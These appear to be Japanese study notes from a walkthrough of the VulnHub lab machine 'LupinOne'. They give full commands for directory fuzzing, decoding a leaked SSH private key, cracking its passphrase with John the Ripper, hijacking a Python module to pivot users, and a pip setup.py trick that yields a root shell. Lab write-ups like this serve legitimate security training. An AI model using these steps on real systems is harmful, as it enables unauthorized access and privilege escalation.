## LupinOne

## Question
- owasp-zapを使う(まだしなくていい)
- ステガノグラフィを調べる
- raft-large-directoriesとrockyouテキストの単語数を調べる
- localとfindコマンドの違いは
- 秘密鍵と公開鍵の中身のフォーマットの違いは
- `$()`これは何？何と呼ぶ？
- ttyコマンドとは
- `sh < $(tty) > $(tty) 2> $(tty)`これは何
- base58とbase64の違いは

### ポートスキャンまで同じ
- 22,80

### 画像を調べる
- ステガノグラフィを調べる

### robots.txtを見る
- `curl http://$IP/robots.txt` 
- ヒントは`/~myfiles`で、ディレクトリの初めに~がついていることがわかる

### 隠しディレクトリを探す
- `wfuzz -c -z file,/home/user/vulnhub/SecLists-master/Discovery/Web-Content/raft-large-directories.txt  --hc 404 "http://$IP/~FUZZ/"`
  - `-c`でカラー表示
  - `-z file,`は辞書の指定だが、わかりにくいので`-w`でいい
- 見つかったファイルは`secret` `myfiles`、時間が長いので2つ見つけたら止める
- (別解)
- `gobuster fuzz -u http://$IP/~FUZZ -w /usr/share/wordlists/dirb/common.txt -b 404`
  - `secret` 異なる辞書を使っている 

### サイトを見る
- 見つけたリンクでサイトを確認する。使われているであろう、ユーザ名がわかる

### さらに隠しファイルを探すが、その前に辞書を整理する
- wfuzzの特性上`#`も200(成功)に反応するので、`#`を辞書から削除する
  - `#`はフラグメント識別子と言って、サイト内の特定の場所に移動できる  
- `grep -v '^\s*#' /usr/share/wordlists/rockyou.txt > ./custom_rockyou.txt`
  - `-v`は`'^\s*#'`以外の正規表現を抜き出す
  -  `^#`は単語の最初が#であるのを抽出
  - `\s`はスペースのことで`\s*`はスペースが０以上あるものを抽出 

### 隠しファイルを探す
- 本来は辞書のファイルを使うが、ここで欲しいのは秘密鍵のファイルで拡張子が`.txt`なので、上で作った、パスワードファイルのrockyou.txtを使う
- また隠れファイルなので頭に`.`をつける
- `wfuzz -c -z file,./custom_rockyou.txt --hc 400,404 "http://$IP/~secret/.FUZZ.txt"`
  - `--hc`statusの400,404は表示させない 
- (別解)
- `gobuster fuzz -u http://$IP/~secret/.FUZZ -w /usr/share/wordlists/rockyou.txt -b 404`
### textのダウンロード
- `curl http://$IP/~secret/.mysecret.txt > .mysecret2.txt`
- コピーする
- CyberChefでペーストして、searchにbase58と入力する。Base58でデコード(復号)する。そして、コピーする
- `cat > key`で貼り付ける。注意するのは、ペーストしたら改行してから、`ctrl + c`で抜ける
- Permissionを変更する
  - `chmod 700 key`
  - なぜか`chmod 777 key`にするとsshが繋がらない

### パスフレーズの解析
- sshのパスフレーズを解析するのにssh2johnを使うが、Evilboxの時と同じように改良する
- `github johntheripper bleeding-jumbo ssh2john py`で検索したコードをコピーする
- `cat > ssh2john_v2.py` ペーストする。注意点は改行してから`ctrl + c`で抜けること
- `chmod +x ssh2john_v2.py`
- john the ripperで使えるようにフォーマットを変換する
  -  `python3 ssh2john_v2.py key > passphrase.txt`
- 暗号解析
  - `sudo john passphrase.txt -wordlist=/usr/share/wordlists/fasttrack.txt`
- パスフレーズが取得できる
  - `P@55w0rd!` 

### sshでアクセス
- `ssh -i key icex64@$IP`
  - パスフレーズの入力 

### システム内の調査
- `sudo -l`
  - `(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py`
- icex64はパスワードなしでarseneとして/home/arsene/heist.pyファイルが実行できることがわかる。つまり実行することで、arseneになることができる
- heist.pyの中身を見る、これが何をしているか？
- Permissionから何がわかる？
- 本来なら、このpyファイルに書き込みたいが、できないのでwebbrowser関数の中に書き込む

### 攻撃アプローチ
- webbrowserがどこにあるか調べる
  - `locate webbrowser`
  - または
  - `find / -name webbrowser* 2> /dev/null`
- webbrowserファイルを開く
  -  `nano /usr/lib/python3.9/webbrowser.py`
  -  import osの下に`os.system("/bin/bash")`を書き込む


### 別ユーザで権限取得
- `sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py`
  - `-u`sudoをユーザを指定して実行する 
- arseneが使えるルートコマンドを調べる
  - `sudo -l` 
- pipコマンドが使える。GTFOBinsのSudoの部分を参考にする。pipはPythonのモジュールをインストールできるコマンド。なので、架空のモジュールを作ってpipを利用する
- 一時的なディレクトリを作って、そこにルートコマンドになれるpythonのセットファイルを作る。変数の設定時にはスペースを空けてはダメ
  - `cd /tmp`
  - `TF=$(mktemp -d)`
  - `echo $TF`
  - `echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh < $(tty) > $(tty) 2> $(tty)')" > $TF/setup.py`
    - os.execl('/bin ~ $(tty)') これをシングルクォーテーションひとつで書くとエラーになる。なぜかはわからん 
  - `ls $TF`
  - `sudo pip install $TF`

### ルートフラグの取得
- ルートシェルを奪取できた
- `cd /root`
- `cat root.txt`




